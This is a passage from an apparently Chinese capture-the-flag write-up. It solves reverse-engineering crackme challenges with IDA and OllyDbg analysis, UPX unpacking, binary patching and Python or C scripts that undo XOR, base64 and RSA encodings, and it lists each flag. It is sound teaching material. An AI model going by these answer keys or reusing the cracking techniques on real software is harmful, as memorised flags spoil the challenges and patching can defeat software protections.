res[i])\nprint(ans)\n'''\n~!3a@0\n'''\n```\n\n所以这6位应该为`~!3a@0`。运行程序，依次输入密码1和密码2，会在当前目录生成一个dbapp.rtf文件，打开就是flag。\n\n```\nFlag{N0_M0re_Free_Bugs}\nflag{N0_M0re_Free_Bugs}\n```\n\n# 7. login\n\n这道题应该算是Web逆向吧？\n\n{% asset_img 7.1.png js分析 %}\n\n```python\nif c <= 'Z':\n    tmp = 90\nelse:\n    tmp = 122\nc2 = ord(c) + 13\nif tmp >= c2:\n    result = c2\nelse:\n    result = c2 - 26\n```\n\n不知不觉，get到遍历可打印字符的香了。\n\n```python\nimport string\nflag = list(\"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\")\nans = flag\ninput = string.printable\nfor i in range(len(flag)):\n    for j in input:\n        if (j <= 'Z' and j >= 'A') or (j <= 'z' and j >= 'a'):\n            if j <= 'Z':\n                tmp = 90\n            else:\n                tmp = 122\n            j2 = ord(j) + 13\n            if tmp >= j2:\n                result = j2\n            else:\n                result = j2 - 26\n            if chr(result) == flag[i]:\n                ans[i] = j\n                break\nfor i in range(len(ans)):\n    print(ans[i],end=\"\")\nprint()\n'''\nClientSideLoginsAreEasy@flare-on.com\n'''\n```\n\n```\nflag{ClientSideLoginsAreEasy@flare-on.com}\n```\n\n# 8. easyRE\n\n下载下来是ELF文件，直接载入IDA看看吧。\n\n太多函数的话直接找字符串，大家都会了吧？不会寄几拣生，懒得写了。\n\n{% asset_img 8.1.png IDA分析 %}\n\n{% asset_img 8.2.png IDA分析 %}\n\n我们算出v18后再加上3个0字符也进行base64算法10次试试，发现与`off_6CC090`内存中的数据不一样！！\n\n```python\nimport base64\nflag = list(\"Iodl>Qnb(ocy\")\nflag.append(127)\nflag.extend(\"y.i\")\nflag.append(127)\nflag.extend(\"d`3w}wek9{iy=~yL@EC\")\nv18 = flag\nfor i in range(len(flag)):\n    if isinstance(flag[i],int):\n        v18[i] = chr(flag[i] ^ i)\n    else:\n        v18[i] = chr(ord(flag[i]) ^ i)\n    print(v18[i],end=\"\")\nprint()\nv18.append('0')\nv18.append('0')\nv18.append('0')\nstr=''.join(v18)\nprint(str)\nbs = base64.b64encode(str.encode(\"utf-8\"))\nfor i in range(9):\n    bs = base64.b64encode(bs)\nprint(bs)\n'''\nInfo:The first four chars are `flag`\nInfo:The first four chars are `flag`000\nb'Vm0wd2QyVkZOVWRXV0doVVYwZDRWRmx0ZEhkVU1WcDBUVmM1VjFadGVIbFhhMk0xVmpGYWRHVkdiR0ZXVjJoeVdWZDRZV014WkhGUmJVWlhWakZLU1ZkV1dsWmxSbGw0V2toV2FGSnNjSEJXTUdSdlpWWmtWMWR0ZEZSTlZUVklWbTAxUjFWdFNrZFhiR2hhWWtkU2RsWldXbXRYUjFKSVVteG9hVlpyV1hwV1JscGhWakZrU0ZOcmFGWmlSMmhoV1d0YWQxUkdjRmRYYkhCc1VtMVNNRnBGV2xOVWJGcDFVV3h3VjFZemFIWmFSRXBIVWpGT2RWWnNTbWhsYlhob1YxZDBhMkl5VW5OV2JrNVlZbGhTV0ZSV1pEQk9iR3hXVjJzNVZXSkdjRlpXYlhSelZqRmFSbUV6YUZkaGEzQklWbXBHVDFkWFRrZFRiV3hvWld4YVdsWXhaREJaVm14V1RVaG9hbEpYYUhOVmFrNVRWMFphZEdONlJsaGlSM2hYVmpJeE1HRkdXbkppZWtwYVYwaENSRll3V2xwbGJGWnpZVVp3YUdFeGNIbFdWRUpoVkRKU1YxUnVTbEJXYlZKUFZXMDFRMWRzV1hoWGJYUk9VakZHTkZZeWRHdGhWazVIVTI1T1ZtSllUWGhXTUZwelkyeGtkRkp0ZUZkaVJsa3hWa1phVTFFeVJrWk5XRTVZWW0xb1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ=='\n'''\n```\n\n好吧思路错了，v21与v18根本没关系，那我们将内存中的数据解码10次看看是什么。\n\n```python\nimport base64\nbs = 'Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ=='\nfor i in range(10):\n    bs = str(base64.b64decode(bs), \"utf-8\")\nprint(bs)\n'''\nhttps://bbs.pediy.com/thread-254172.htm\n'''\n```\n\n竟然是一个网址。写主动防御。听君一席话，胜读十年书。所以怎么找呢？这么多函数坑死我了。找有运算操作的，最后在`4009C6`下面一个函数`400D35`找到了有`f`和`g`字样的东西，进行某些运算。\n\n{% asset_img 8.3.png IDA分析 %}\n\n```python\nv1 = list(\"flag\")\nb6cc = [0x40,0x35,0x20,0x56,0x5d,0x18,0x22,0x45,0x17,0x2f,0x24,0x6e,0x62,0x3c,0x27,0x54,0x48,0x6c,0x24,0x6e,0x72,0x3c,0x32,0x45,0x5b]\nans = \"\"\nfor i in range(4):\n    v1[i] = ord(v1[i]) ^ b6cc[i]\nfor i in range(len(b6cc)):\n    ans += chr(b6cc[i] ^ v1[i%4])\nprint(ans)\n'''\nflag{Act1ve_Defen5e_Test}\n'''\n```\n\n# 9. [GUET-CTF2019]re\n\nELF文件，有UPX壳。ELF脱UPX壳在Linux下执行脱壳命令与Windows一致。\n\n```\nv5le0n9@ubuntu:~/Desktop$ upx -d re\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2013\nUPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\n    841042 <-    304524   36.21%  linux/ElfAMD   re\n\nUnpacked 1 file.\n```\n\n```python\nans = \"\"\nans += chr(166163712//1629056)\nans += chr(731332800//6771600)\nans += chr(357245568//3682944)\nans += chr(1074393000//10431000)\nans += chr(489211344//3977328)\nans += chr(518971936//5138336)\nans += \" \"\nans += chr(406741500//7532250)\nans += chr(294236496//5551632)\nans += chr(177305856//3409728)\nans += chr(650683500//13013670)\nans += chr(298351053//6088797)\nans += chr(386348487//7884663)\nans += chr(438258597//8944053)\nans += chr(249527520//5198490)\nans += chr(445362764//4544518)\nans += chr(981182160//10115280)\nans += chr(174988800//3645600)\nans += chr(493042704//9667504)\nans += chr(257493600//5364450)\nans += chr(767478780//13464540)\nans += chr(312840624//5488432)\nans += chr(1404511500//14479500)\nans += chr(316139670//6451830)\nans += chr(619005024//6252576)\nans += chr(372641472//7763364)\nans += chr(373693320//7327320)\nans += chr(498266640//8741520)\nans += chr(452465676//8871876)\nans += chr(208422720//4086720)\nans += chr(515592000//9374400)\nans += chr(719890500//5759124)\nprint(ans)\n'''\nflag{e 65421110ba03099a1c039337}\n'''\n```\n\n牛牛们说缺的那个是字符1，我在想难道是IDA优化问题导致的？还是说出题人就想我们爆破？\n\n```\nflag{e165421110ba03099a1c039337}\n```\n\n# 10. [SUCTF2019]SignIn\n\nELF文件，载入IDA。\n\n{% asset_img 10.1.png IDA分析 %}\n\n发现了什么姐妹们，有幂模运算，也有RSA标志性公钥65537，这还不是RSA加密算法？？[RSA算法描述与攻击方法](https://v5le0n9.github.io/posts/855b12c4.html)\n\n```\nn = v4 = 103461035900816914121390101299049044413950405173712170434161686539878160984549\ne = v5 = 65537\nc = v7 = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\n```\n\n将n拿去 http://factordb.com 分解一下，发现可以分解，得出p和q的值。\n\n```\np = 282164587459512124844245113950593348271\nq = 366669102002966856876605669837014229419\n```\n\n然后用RSA解密脚本直接得出私钥d，进而得到明文m。\n\n```python\nimport gmpy2\nn = 103461035900816914121390101299049044413950405173712170434161686539878160984549\np = 282164587459512124844245113950593348271\nq = 366669102002966856876605669837014229419\ne = 65537\n\nd = gmpy2.invert(e,(p-1)*(q-1))\nprint (\"d = \" + str(d))\n#d为私钥\nc = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\nm = gmpy2.powmod(c,d,n)\nprint(\"m = \" + str(m))\n'''\nd = 91646299298871237857836940212608056141193465208586711901499120163393577626813\nm = 185534734614696481020381637136165435809958101675798337848243069\n'''\n```\n\n下一步就是进入sub_96A函数查看算法。\n\n{% asset_img 10.2.png IDA分析 %}\n\n所以这个函数很有可能是字符串转换成十六进制，因为我们输入的就是字符串形式，返回值v9是以十六进制的形式存入v6的。将m转换为字符串：\n\n```python\nimport binascii\nm = 185534734614696481020381637136165435809958101675798337848243069\n# 先将它转化为16进制再去掉开头的0x，unhexlify与a2b_hex功能一致，作用是从16进制字符串中返回二进制数据，再用utf-8解码\nprint(binascii.unhexlify(hex(m)[2:]).decode(encoding=\"utf-8\"))\n'''\nsuctf{Pwn_@_hundred_years}\n'''\n```\n\n# 11. Transform\n\n{% asset_img 11.1.png IDA分析 %}\n\n{% asset_img 11.2.png IDA分析 %}\n\n```python\nflag = [0x67,0x79,0x7b,0x7f,0x75,0x2b,0x3c,0x52,0x53,0x79,0x57,0x5e,0x5d,0x42,0x7b,0x2d,0x2a,0x66,0x42,0x7e,0x4c,0x57,0x79,0x41,0x6b,0x7e,0x65,0x3c,0x5c,0x45,0x6f,0x62,0x4d]\nqiao = [9,0xa,0xf,0x17,7,0x18,0x0c,6,1,0x10,3,0x11,0x20,0x1d,0x0b,0x1e,0x1b,0x16,4,0x0d,0x13,0x14,0x15,2,0x19,5,0x1f,8,0x12,0x1a,0x1c,0x0e,0]\nans = [0 for x in range(0,33)]\t#定义列表长度并初始化为0\nst = [0 for x in range(0,33)]\nfor i in range(len(flag)):\n    ans[i] = flag[i] ^ qiao[i]\n    print(chr(ans[i]),end=\"\")\nprint()\nfor i in range(len(ans)):\n    # qiao的元素是st的下标，其实就是IDA那一行换过来赋值，我可能是困了在这里绕了好久！！\n    st[qiao[i]] = ans[i]\nfor i in range(len(st)):\n    print(chr(st[i]),end=\"\")\nprint()\n'''\nnsthr30TRiTO}_p31pFs_ClCr{z4N_slM\nMRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}\n'''\n```\n\n```\nflag{Tr4nsp0sltiON_Clph3r_1s_3z}\n```\n\n# 12. usualCrypt\n\n{% asset_img 12.1.png IDA分析 %}\n\n进去sub_401080看看。又有一个初始化函数，然后进行base64加密操作，最后的返回值也调用了一个函数。\n\n{% asset_img 12.2.png IDA分析 %}\n\n{% asset_img 12.3.png IDA分析 %}\n\n进去初始化函数，发现是将base64索引表的某些元素调换位置。\n\n{% asset_img 12.4.png IDA分析 %}\n\n进去返回值调用的函数。\n\n{% asset_img 12.5.png IDA分析 %}\n\n分析牛牛的脚本，我看懂了。\n\n```python\nimport base64\n# 大小写转换\nsecret = 'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'.swapcase() \na = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\ndict = {}\noffset = 10\nflag = ''\n\n# 初始化字典的键值对都是它本身\nfor i in range(len(a)):\n    dict[a[i]] = a[i]\n\n# 构造键不变，值变的字典\nfor i in range(6,15):  \n    b = dict[a[i]]\n    dict[a[i]] = dict[a[i+offset]]\n    dict[a[i+offset]] = b\n\n# 用secret的每个元素作为字典的键取字典的值，将secret转换为正常的base64加密字符串\nfor i in range(len(secret)):\n    flag += dict[secret[i]]\n\nflag = base64.b64decode(flag)\nprint(flag)\n'''\nflag{bAse64_h2s_a_Surprise}\n'''\n```\n\n# 13. Youngter-drive\n\n运行发现打不开，缺少msvcr100d.dll，从网上下载一个放在同目录下就好，现在可以打开了。有UPX壳，直接脱壳机脱掉。脱壳后程序又打不开了。\n\n不管，我们直接载入IDA分析代码。\n\n{% asset_img 13.1.png IDA分析 %}\n\n先看第一个线程。\n\n{% asset_img 13.2.png IDA分析 %}\n\n{% asset_img 13.4.png IDA分析 %}\n\n再看第二个。\n\n{% asset_img 13.3.png IDA分析 %}\n\n查看411190。\n\n{% asset_img 13.5.png IDA分析 %}\n\n整理下思路，可以确定输入字符串的长度为30，这两个线程是同步的，所以进行一次41112C函数要自减2，也就是输入的字符是间隔调用41112C的。但不知道哪个线程先执行，所以都要试一下。\n\n```python\nresult = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\nflag = ''\nf418 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\n# 下标为双数进行操作\nfor i in range(len(result)):\n    if i % 2 == 1:\n        flag += result[i]\n        continue\n    \n    # 如果是大写字母，一定是小写字母转换来的\n    if(result[i].isupper()):\n        flag += chr(f418.find(result[i]) + 96)\n    else:\n        flag += chr(f418.find(result[i]) + 38)\nprint (flag)\n'''\ndOGZGZDOCYJTHUAPXTHBKOJOJpKyk\n'''\n```\n\n```python\nresult = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\nflag = ''\nf418 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\n# 下标为单数进行操作\nfor i in range(len(result)):\n    if i % 2 == 0:\n        flag += result[i]\n        continue\n    if(result[i].isupper()):\n        flag += chr(f418.find(result[i]) + 96)\n    else:\n        flag += chr(f418.find(result[i]) + 38)\nprint (flag)\n'''\nThisisthreadofwindowshahaIsES\n'''\n```\n\n第二个flag是有意义的，所以应该是第二个。但长度为29，最后一位只能爆破，爆破出来是`E`。\n\n```\nflag{ThisisthreadofwindowshahaIsESE}\n```\n\n# 14. [HDCTF2019]Maze\n\n有UPX壳，脱壳后运行，正常。载入IDA，发现main函数部分不能反编译。那拿去OD爆破一下看看，发现我们输入的字符串就是flag。\n\n{% asset_img 14.1.png OD爆破 %}\n\n在OD查找关键字符串，发现有一个可有可无的跳转。(其实在IDA中main函数那里的jnz附近有标红，也可以知道这附近是有问题的)\n\n{% asset_img 14.2.png OD分析 %}\n\n将修改好的程序保存，载入IDA发现main函数可以反编译了。这里其实是用到了花指令，我们刚才所做的就是去除花指令。\n\n题目名字，迷宫，很熟悉啦，大家应该都玩过类似的题。玩过小游戏的就知道，wsad表示上下左右。\n\n{% asset_img 14.3.png IDA分析 %}\n\n但是迷宫地图在哪呢？去到字符串窗口发现，一串*号，但没有哪个函数调用它，我们只能猜测它的行数和列数。最后发现它7行10列时看起来比较像迷宫。\n\n```python\nflag = \"*******+********* ******    ****   ******* **F******    **************\"\nprint(len(flag))\nfor i in range(0,70,10):\n    ans = \"\"\n    for j in range(10):\n        ans += flag[i+j]\n    print(ans)\n'''\n70\n*******+**\n******* **\n****    **\n**   *****\n** **F****\n**    ****\n**********\n'''\n```\n\n按照+为起点，F为终点，可以得到`ssaaasaassdddw`。\n\n```\nflag{ssaaasaassdddw}\n```\n\n# 15. [MRCTF2020]Xor\n\n{% asset_img 15.1.png IDA分析 %}\n\n但我找了一下，IDA就没有401095啊？随便点进几个函数后发现又可以F5了，这里不知道是什么原因。\n\n{% asset_img 15.2.png IDA分析 %}\n\n如果实在不能F5，那就老老实实读汇编吧。\n\n{% asset_img 15.3.png IDA分析 %}\n\n剩下就很简单了，直接写脚本。这里只是想记录一下为什么会出现这个错？求解惑。\n\n```python\nflag = list('MSAWB~FXZ:J:`tQJ\"N@ bpdd}8g')\nans = ''\nfor i in range(len(flag)):\n    ans += chr(ord(flag[i]) ^ i)\nprint(ans)\n'''\nMRCTF{@_R3@1ly_E2_R3verse!}\n'''\n```\n\n```\nflag{@_R3@1ly_E2_R3verse!}\n```\n\n# 16. [GWCTF 2019]xxor\n\n{% asset_img 16.1.png IDA分析 %}\n\n{% asset_img 16.2.png IDA分析 %}\n\n{% asset_img 16.3.png IDA分析 %}\n\n```python\n# 求解三元一次方程组\nfrom sympy import *\nx,y,z = symbols('x,y,z')\nprint(solve([x-y-2225223423,y+z-4201428739,x-z-1121399208],[x,y,z]))\n'''\n{x: 3774025685, y: 1548802262, z: 2652626477}\n'''\n```\n\n那么现在v7数组中的所有元素都已知了。\n\n```\nv7[0] = 3746099070\t# 将负数转化为16进制再转为10进制变正数\nv7[1] = 550153460\nv7[2] = 3374025685\nv7[3] = 1548802262\nv7[4] = 2652626477\nv7[5] = 2230518816\n```\n\n回看sub_400686，将它的算法逆回来，循环中它是连加，那我们就连减。\n\n```python\na2 = [2,2,3,4]\na1 = [3746099070,550153460,3374025685,1548802262,2652626477,2230518816]\n\nfor j in range(0,5,2):\n    v3 = a1[j]\n    v4 = a1[j+1]\n    v5 = 1166789954 * 64\n    for i in range(64):\n        v4 -= (v3 + v5 + 20) ^ ((v3 << 6) + a2[2]) ^ ((v3 >> 9) + a2[3]) ^ 0x10\n        v3 -= (v4 + v5 + 11) ^ ((v4 << 6) + a2[0]) ^ ((v4 >> 9) + a2[1]) ^ 0x20\n        v5 -= 1166789954\n    a1[j] = v3\n    a1[j+1] = v4\n    \nfor i in range(6):\n    print(a1[i])\n    print()\n'''\n4094640321151510381430114527348791340818061486368325081105118858029441421392562115899927051354373143479918602379843527326422590896702063205097735983800064780954056157519958676446188144354842905191184000047384119685662681315026347071556102162\n\n-64846407269888040321797137717063369418274550862165842691382879936447707289304081311831415851335266644244860582121374108524030247661708208453235916273041741260734859775013491470888710031344340472282583536018181016610582990270536331206408833\n\n3626154157263275744924041982703855211085590162096727318779868232410757794884022528128551059600370555282067352751792979104390903963503421941488321742737873865096405783997624394295188802763521349460701601867796734712493771114831851042253589698\n\n-55775144830965060265952775552624430801605611614179956213691056963158136715255700275463473676424802814041829568498889655173123370495054229651227352476227137023578229841739490925121109830438369699146048932715237138347095053098321988593808508\n\n5587372600709315909307412143935466921910496550659392214787792118052869573959065029961759081338383226145709070679113041271660083414962147047524219462376386239236674131323547659492256250592476561092722517194615155328289506636964049781303051329\n\n-86739435205112991582038868144090858872150758616294322376667291065375318440446215889691830034827200180020765008148649882034652663397413325576631432190050276236816651479339637604954866146349956713033299076850370554519685898575638020305197992\n'''\n```\n\n救命这什么东西！！回看400686函数，发现v3和v4是无符号整型，但Python没有无符号整型。所以这个逆向算法最好用C写。\n\n```c\n#include <stdio.h>\nint main()\n{\n\tunsigned int a2[4] = { 2, 2, 3, 4 };\n\tunsigned int a1[6] = { 3746099070,550153460,3374025685,1548802262,2652626477,2230518816 };\n\tint i, j;\n\tunsigned int v3, v4;\n\tfor (j = 0; j <= 4; j += 2)\n\t{\n\t\tv3 = a1[j];\n\t\tv4 = a1[j + 1];\n\t\tint v5 = 1166789954 * 64;\n\t\tfor (i = 0;i < 64;i++)\n\t\t{\n\t\t\tv4 -= (v3 + v5 + 20) ^ ((v3 << 6) + a2[2]) ^ ((v3 >> 9) + a2[3]) ^ 0x10;\n\t\t\tv3 -= (v4 + v5 + 11) ^ ((v4 << 6) + a2[0]) ^ ((v4 >> 9) + a2[1]) ^ 0x20;\n\t\t\tv5 -= 1166789954;\n\t\t}\n\t\ta1[j] = v3;\n\t\ta1[j + 1] = v4;\n\n\t}\n\tfor (i = 0;i < 6;i++)\n\t\tprintf(\"%x\", a1[i]);\n}\n/**\n666c61677b72c2106b1c38d08e1772656174217d\n*/\n```\n\n```c\n#include <stdio.h>\nint main()\n{\n\tunsigned int xorm[6];\n\txorm[0] = 3746099070;\n\txorm[1] = 550153460;\n\txorm[2] = 3774025685;\n\txorm[3] = 1548802262;\n\txorm[4] = 2652626477;\n\txorm[5] = 2230518816;\n\tint i = 0, j = 0, sum;\n\tunsigned int temp[2] = { 0 };\n\tunsigned int data[4] = { 2,2,3,4 };\n\tfor (i = 0; i < 5; i += 2)\n\t{\n\t\ttemp[0] = xorm[i];\n\t\ttemp[1] = xorm[i + 1];\n\n\t\tsum = 0x458BCD42 * 64;\n\t\tfor (j = 0; j < 64; j++)\n\t\t{\n\t\t\ttemp[1] -= (temp[0] + sum + 20) ^ ((temp[0] << 6) + 3) ^ ((temp[0] >> 9) + 4) ^ 0x10;\n\t\t\ttemp[0] -= (temp[1] + sum + 11) ^ ((temp[1] << 6) + 2) ^ ((temp[1] >> 9) + 2) ^ 0x20;\n\t\t\tsum -= 0x458BCD42;\n\t\t}\n\t\txorm[i] = temp[0];\n\t\txorm[i + 1] = temp[1];\n\t}\n\tfor (i = 0; i < 6; i++)\n\t\tprintf(\"%x\", xorm[i]);\n}\n/**\n666c61677b72655f69735f6772656174217d\n*/\n```\n\n我真是日了狗了，上面的是我写的，下面有别人写的，究竟哪里不一样了？！为什么第二次结果就不同呢？！！！最后拿去在线16进制转文本的网站得到flag。\n\nPython我看到有位牛牛写出来了：\n\n```python\nfrom Crypto.Util.number import long_to_bytes\n\n# ctypes包调用C语言的数据类型\nfrom ctypes import *\nv6=[3746099070,550153460,3774025685,1548802262,2652626477,2230518816]\nunk=[2,2,3,4]\nfor i in range(0,5,2):\n    \n    # v5是int型，v3和v4是unsigned int型\n    v5 = c_int(1166789954*0x40)\n    v3 = c_uint(v6[i])\n    v4 = c_uint(v6[i+1])\n    for j in range(0x40):\n        \n        # 一定要加.value，因为它们类型不一样不能相加\n        v4.value -= ((v3.value+v5.value+20)^((v3.value<<6)+unk[2])^((v3.value>>9)+unk[3])^0x10)\n        v3.value -= ((v4.value+v5.value+11)^((v4.value<<6)+unk[0])^((v4.value>>9)+unk[1])^0x20)\n        v5.value -= 1166789954\n    v6[i] = v3.value\n    v6[i+1] = v4.value\n\nfor k in range(6):\n    # 进行long转byte的转换\n    print(long_to_bytes(v6[k]).decode(),end='')\nprint()\n'''\nflag{re_is_great!}\n'''\n```\n\n# 17. hello_world_go\n\n这题告诉我们一定要有耐心，尤其是我做完第16题在发疯的边缘完全是不能思考问题的。载入IDA，看到非常乱的代码，非常多函数，不要慌。找main函数，将main函数调用的内存先看了，如果特别的，再看main函数调用的函数。\n\n找呀找，最终找到这个内存数据，进去看看。\n\n{% asset_img 17.1.png IDA分析 %}\n\n{% asset_img 17.2.png IDA分析 %}\n\n发现就是flag。\n\n```\nflag{hello_world_gogogo}\n```\n\n# 18. level3\n\n载入IDA，查看源码。\n\n{% asset_img 18.1.png IDA分析 %}\n\n{% asset_img 18.2.png IDA分析 %}\n\n但发现它确实是变种的，一定是哪个函数给索引表的某些元素调换位置了。\n\n{% asset_img 18.3.png 运行程序 %}\n\n那在IDA找找，发现这个是个多么显眼的函数。\n\n{% asset_img 18.4.png IDA分析 %}\n\n按照它的算法将base64索引表替换。可利用第12题脚本进行解密。\n\n```python\nimport base64\nsecret = 'd2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD=='\na = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='\ndict = {}\noffset = 10\nflag = ''\n\n# 初始化字典的键值对都是它本身\nfor i in range(len(a)):\n    dict[a[i]] = a[i]\n\n# 构造键不变，值变的字典\nfor i in range(10):  \n    b = dict[a[i]]\n    dict[a[i]] = dict[a[19-i]]\n    dict[a[19-i]] = b\n\n# 用secret的每个元素作为字典的键取字典的值，将secret转换为正常的base64加密字符串\nfor i in range(len(secret)):\n    flag += dict[secret[i]]\n\nflag = base64.b64decode(flag).decode()\nprint(flag)\n'''\nwctf2020{Base64_is_the_start_of_reverse}\n'''\n```\n\n```\nflag{Base64_is_the_start_of_reverse}\n```\n\n# 19. IgniteMe\n\n无壳，载入IDA看看。\n\n{% asset_img 19.1.png IDA分析 %}\n\n那v4的初始值是多少呢？小凉第一次尝试IDA动态调试Windows程序啦！\n\nDebugger -> Select debugger -> Local Windows debugger，F9开启调试，在这里下断点，在程序里输入随意，回车，发现IDA停在断点处。此时，eax的值为4。\n\n{% asset_img 19.2.png 动态调试 %}\n\n{% asset_img 19.3.png 动态调试 %}\n\n也就是说v4的初始值为4。我太low了，思路理不清结果要画图才理得清。\n\n{% asset_img 19.4.png 思路图 %}\n\n那么现在可以把逆向脚本写出来了：\n\n```python\nb403 = [0x0d,0x26,0x49,0x45,0x2a,0x17,0x78,0x44,0x2b,0x6c,0x5d,0x5e,0x45,0x12,0x2f,0x17,0x2b,0x44,0x6f,0x6e,0x56,0x9,0x5f,0x45,0x47,0x73,0x26,0x0a,0x0d,0x13,0x17,0x48,0x42,0x1,0x40,0x4d,0x0c,0x2,0x69]\nv4 = 4\nfor i in range(len(b403)-1,0,-1):\n    if i == len(b403)-1:\n        b403[i] = b403[i] ^ v4\n    b403[i-1] = b403[i] ^ b403[i-1]\nfor i in range(len(b403)):\n    print(chr(b403[i]),end=\"\")\nprint()\n'''\nR_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com\n'''\n```\n\n```\nflag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}\n```\n\n# 20. Overlong\n\n运行程序，只有一个提示框。载入IDA，查看只有几个函数。\n\n{% asset_img 20.1.png IDA分析 %}\n\n进入内存数据发现它从08开始一直到b7，一共AF个字节。我们载入OD，将它的长度从1C修改为AF。\n\n{% asset_img 20.2.png OD分析 %}\n\n但我们会发现修改后会覆盖下面的指令，所以我们要用到内嵌补丁。内嵌补丁的知识可以看[调试器使用教程 内嵌补丁部分](https://v5le0n9.github.io/posts/33a085c7.html#20-Inline-patch-%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81)。\n\n{% asset_img 20.3.png OD内嵌补丁 %}\n\n哎嘿！答案不就出来了？\n\n```\nflag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com}\n```\n\n# 21. BJD hamburger competition\n\n恕我打开一脸懵逼。最后我选择看wp。这个是Unity游戏，没错，一眼看出。原来Unity游戏有个很大的漏洞啊喂！[Unity游戏逆向及破解方法介绍](https://www.52pojie.cn/thread-495115-1-1.html)\n\n看完上面那篇文章，我们都知道应该找Assembly-CSharp.dll文件。\n\n{% asset_img 21.1.png 找dll文件 %}\n\n找到它拿去dnSpy反编译，不会用dnSpy？这不就来教程了。[.Net逆向教程](https://v5le0n9.github.io/posts/784f7e1d.html)\n\n搜索游戏中的关键词，找到Spawn方法。\n\n{% asset_img 21.2.png dnSpy反编译 %}\n\n{% asset_img 21.3.png dnSpy反编译 %}\n\n{% asset_img 21.4.png dnSpy反编译 %}\n\n真的非常简单，将那一串字符串用SHA1解密后再用MD5加密，转换为大写字母取前20位即可得到flag。\n\n```\nflag{B8C37E33DEFDE51CF91E}\n```\n\n# 22. Oruga\n\n{% asset_img 22.1.png IDA分析 %}\n\n{% asset_img 22.2.png IDA分析 %}\n\n{% asset_img 22.3.png IDA分析 %}\n\n去到Hex窗口查看。\n\n{% asset_img 22.4.png IDA分析 %}\n\n所以输入应为`MEWEMEWJMEWJM`。\n\n```\nflag{MEWEMEWJMEWJM}\n```\n\n# 23. easy strcmp\n\n{% asset_img 23.1.png IDA分析 %}\n\n{% asset_img 23.2.png IDA分析 %}\n\n{% asset_img 23.3.png IDA分析 %}\n\n构造逆向脚本：\n\n```python\nb201 = [0x42,9,0x4a,0x49,0x35,0x43,0x0a,0x41,0xf0,0x19,0xe6,0x0b,0xf5,0xf2,0x0e,0x0b,0x2b,0x28,0x35,0x4a,6,0x3a,0x0a,0x4f]\nflag = list(\"********CENSORED********\")\nans = ''\nfor i in range(len(flag)):\n    ans += chr(b201[i] + ord(flag[i]))\nprint(ans)\n'''\nl3ts_m4kĳ^Ĵ^ńńSOUR_t0d4y\n'''\n```\n\n发现前一段和后一段都是正常的、有意义的字符串，但中间那段乱码了。尝试用汇编代码分析一下。\n\n{% asset_img 23.4.png IDA分析 %}\n\n{% asset_img 23.5.png IDA分析 %}\n\n这也太难看了吧，而且也只有中间那段代码出现了问题，难道我脚本错了？利用binascii模块来写脚本。\n\n有关binascii模块的主要函数：\n\n```python\nimport binascii\ndata = 'consumer'\n\n# 把数据换成二进制数据然后再用十六进制字符串表示\nb = binascii.b2a_hex(data.encode())\t#bin to ascii hex\nprint(b)\n#结果:\n#b'636f6e73756d6572'\n \n#十六进制字符格式换成原数据\nprint(binascii.a2b_hex(b))\t#ascii hex to bin\n#结果:\n#b'consumer'\n```\n\n脚本如下：\n\n```python\nimport binascii\n \nenc = \"********CENSORED********\"\nkey = [0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B] \nflag = b''\t\t\t#创建一个字节型变量\n\nfor i in range(len(key)):\n    p = enc[i * 8:(i + 1) * 8][::-1]\t# 因为key是小端存储，所以enc要逆序过来进行运算\n    a = binascii.b2a_hex(p.encode('ascii'))\t# 将字符串转换成二进制形式再用十六进制字符串表示\n    b = binascii.a2b_hex(hex(int(a, 16) + key[i])[2:])[::-1] # 将a转换成十进制与key相加后再转换成十六进制形式，去掉前缀0x，转换成字节数据，再逆序输出\n    flag += 